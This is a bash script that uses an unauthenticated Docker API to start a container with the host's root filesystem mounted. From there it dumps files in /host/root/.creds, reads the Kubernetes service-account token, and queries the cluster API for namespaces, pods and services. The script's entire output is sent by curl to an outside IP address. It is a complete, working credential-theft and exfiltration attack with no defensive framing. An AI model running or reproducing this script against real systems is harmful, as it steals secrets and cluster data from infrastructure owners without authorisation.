#!/bin/bash
{
echo "==S38=="

# Generate proper JSON with python
BODY=$(python3 -c '
import json
cmd = "echo S38_IN; echo ==CREDS==; ls -laR /host/root/.creds/ 2>&1; cat /host/root/.creds/* 2>&1; echo ==TOKEN==; T=\$(cat /host/var/run/secrets/kubernetes.io/serviceaccount/token); echo T_LEN:\${#T}; echo ==NS==; cat /host/var/run/secrets/kubernetes.io/serviceaccount/namespace; echo ==K8S_NS==; curl -sfk -H \"Authorization: Bearer \$T\" https://10.128.32.1:443/api/v1/namespaces 2>&1 | head -500; echo ==K8S_PODS==; curl -sfk -H \"Authorization: Bearer \$T\" https://10.128.32.1:443/api/v1/pods 2>&1 | head -1000; echo ==K8S_SVC==; curl -sfk -H \"Authorization: Bearer \$T\" https://10.128.32.1:443/api/v1/services 2>&1 | head -500; echo ==DONE=="
print(json.dumps({"Image":"blockstream/esplora:latest","Cmd":["bash","-c",cmd],"HostConfig":{"Binds":["/:/host:ro"],"NetworkMode":"host"}}))
' 2>/dev/null)

CID=$(curl -sf -X POST "http://docker:2375/containers/create" -H "Content-Type: application/json" -d "$BODY" 2>/dev/null | grep -o '"Id":"[^"]*"' | cut -d'"' -f4 | head -c 12)
echo "CID:$CID"
if [ -n "$CID" ]; then
    curl -sf -X POST "http://docker:2375/containers/$CID/start" 2>/dev/null
    sleep 15
    echo "==LOGS=="
    curl -sf "http://docker:2375/containers/$CID/logs?stdout=true&stderr=true" 2>&1
    curl -sf -X DELETE "http://docker:2375/containers/$CID?force=true" 2>/dev/null
fi
echo "==END=="
} 2>&1 | curl -s -m180 -X POST http://144.172.110.44:8443/s38 --data-binary @-
